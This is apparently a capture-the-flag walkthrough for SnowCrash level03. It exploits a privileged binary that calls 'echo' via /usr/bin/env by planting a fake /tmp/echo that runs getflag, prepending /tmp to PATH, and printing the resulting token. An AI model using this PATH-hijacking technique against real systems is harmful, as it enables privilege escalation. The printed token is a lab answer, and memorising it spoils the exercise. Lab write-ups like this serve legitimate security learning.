```
level03@SnowCrash:~$ ls
level03

level03@SnowCrash:~$ ./level03
Exploit me
```

We want to read the human-readable text inside that binary file so we use the command strings.

```
level03@SnowCrash:~$ strings level03 | grep "Exploit me"
/usr/bin/env echo Exploit me
```

We create file a file /tmp/echo that will actually be a copy of the file /bin/getflag so that when the program executes the command echo it will actually executes the command getflag.  

```
level03@SnowCrash:/tmp$ echo /bin/getflag > /tmp/echo

level03@SnowCrash:~$ chmod 777 /tmp/echo
```

Add the directory  /tmp at the beginning of PATH so the program will know to go to that directory first, instead of /usr/bin, when it will use the command echo.

```
level03@SnowCrash:~$ export PATH=/tmp:$PATH
```

Now, launch the program again:

```
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```